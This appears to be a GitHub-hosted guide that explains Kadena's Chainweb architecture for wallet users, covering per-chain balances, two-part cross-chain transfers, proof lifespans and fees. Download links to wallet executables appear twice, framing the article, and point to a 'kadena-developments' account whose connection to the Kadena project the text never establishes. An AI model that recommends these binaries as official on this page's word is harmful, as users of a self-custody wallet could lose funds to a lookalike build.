![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Chainweb's Twenty Chains, Explained for Wallet Users</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Most blockchains have one queue of transactions and one history. Kadena has twenty, braided together so that each one's proof of work also commits to the others. The design is unusual enough that its consequences show up in ordinary wallet use: a balance belongs to a chain, a transfer can be half finished, and an explorer has a chain selector for a reason.

This is what the architecture actually is, and what it changes for someone holding KDA.

## You'll see this if

- You want to know why one network has twenty chains rather than one.
- You have seen a block height that differs between two explorers for the same account.
- You are trying to understand why a transfer involves two confirmations.
- You have read that Kadena is "sharded" and want to know whether that is accurate.

## One network, twenty chains

Kadena's consensus layer is called Chainweb. It runs twenty chains, numbered 0 to 19, each producing its own blocks, each with its own state, and all of them secured by the same proof-of-work network.

Three things follow immediately, and all three surprise people:

1. **The network is single.** There is one mainnet, one token, one address space. Nothing about chain 7 is a separate blockchain in the sense that a testnet or a fork is.
2. **The history is plural.** Each chain has its own block height. Two explorers can legitimately show different heights for the same moment because they are reporting different chains.
3. **State is partitioned.** An account on chain 3 and the same account on chain 11 are separate records that happen to share a name.

That third point is the one that generates support questions. It is not a bug or a sync failure. It is the architecture, visible at the surface.

## Why the chains are braided

Running twenty chains independently would be twenty small networks, each with a fraction of the hashpower and correspondingly weaker security. Chainweb avoids that by linking them: the proof of work that secures one chain also references the others, so an attacker cannot isolate a single chain and attack it cheaply.

The practical effect is that hashrate protects the whole set. The cost is complexity: the protocol has to define how chains refer to each other, how a transaction on one can be proven to another, and what "confirmed" means when confirmations happen per chain.

That is the trade Chainweb makes. Parallelism buys throughput; braiding keeps the security pooled; the price is that everything built on top has to understand chains.

## Consequence one: no transaction spans two chains

There is no operation that debits chain 0 and credits chain 4 atomically. The protocol cannot do it, and no wallet can fake it.

What exists instead is a two-part transfer. The source chain records the debit and produces a proof of inclusion. That proof is then submitted to the destination chain, which verifies it and credits the recipient, creating the account if it does not exist yet.

Two parts means two moments when something can go wrong, and it means a transfer can be complete on one side and absent on the other. That is the origin of every "stuck transfer" report in this ecosystem, and the remedy is to submit the second part, not to send again.

## Consequence two: proofs have a lifespan

Because the destination chain verifies a proof rather than reading the source chain directly, that proof has to remain valid. Proofs are not eternal, and the validity window is a protocol parameter that has changed over time.

For a wallet user this has one practical meaning: a cross-chain transfer completed promptly is routine, and one left half finished for a long period may need a fresh proof before the second half can land. Age is the variable, not the amount.

## Consequence three: fees are paid where work happens

Gas is charged on the chain that executes the transaction. A cross-chain transfer executes twice, once on each side, so it costs twice. A transfer that creates the destination account costs more than one that credits an existing account.

This is also why "insufficient funds" can appear while a wallet shows a healthy balance: the balance on screen may belong to a chain that is not settling the fee.

## What this means in a wallet

| Question | Answer under Chainweb |
| --- | --- |
| Is the address different on each chain? | No. One string, recorded twenty times |
| Does my balance? | Yes, separately on each chain |
| Can I send to an address on any chain? | Yes, if the recipient watches that chain |
| Is a cross-chain send one action? | No, it is two transactions with a proof between them |
| Is there one block height? | No, one per chain |

A wallet that hides all of this is convenient and occasionally misleading. A wallet that exposes the chain is doing the user a favour, because every one of those rows becomes a question someone asks at the worst moment.

## Reading an explorer without confusion

1. **Find the chain selector** before reading any number. Most explorer confusion is a chain mismatch.
2. **Check the block height** and note it belongs to that chain only.
3. **Look for the account, not just the address.** An account that does not exist on a chain has no balance there, which is different from having zero.
4. **For a transfer, read both chains.** Source inclusion is half the story.

## Myths worth dropping

- **"Twenty chains means twenty times faster."** Parallelism helps throughput; it does not divide latency by twenty, and each chain still targets the same block interval.
- **"It is sharded like a database."** Sharding usually means partitioning state under one consensus history. Chainweb partitions the history itself, which is a stronger claim and a stranger one.
- **"Each chain is a separate network."** One network, twenty histories. The token, the address space and the security are shared.

## FAQ

**Do I need to care which chain I use?**
Only when someone else specifies one, which is most often an exchange. Otherwise pick one and stay consistent.

**Why does my explorer show a different height from a friend's?**
You are almost certainly looking at different chains. Check the selector.

**Can a transaction be reversed between chains?**
No. Once the source chain includes the debit, that half is final. The other half can be completed or left, but not undone.

**Is a `k:` address valid on all twenty chains?**
Yes. The string is the same everywhere; whether it holds anything on a given chain is separate.

**What happens if the destination chain is congested?**
The second half waits. The source debit stands, and the transfer completes when the continuation lands.

## Related reading

- Choosing a chain in Kadena Wallet: why balances differ
- Cross-chain transfers in Kadena Wallet: how the twenty chains connect
- Stuck cross-chain transfer in Kadena Wallet: finish it, don't resend
- Community Edition of Kadena, explained

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Cross-Chain Transfers in Kadena Wallet: How the Twenty Chains Actually Connect](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/cross-chain-transfers-in-kadena-wallet.md)
- [Stuck Cross-Chain Transfer in Kadena Wallet: Finish It, Don't Resend](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-wallet-stuck-cross-chain-transfer.md)
- [Sending KDA from Kadena Wallet: Four Checks Before You Press Send](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/how-to-send-kda-from-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
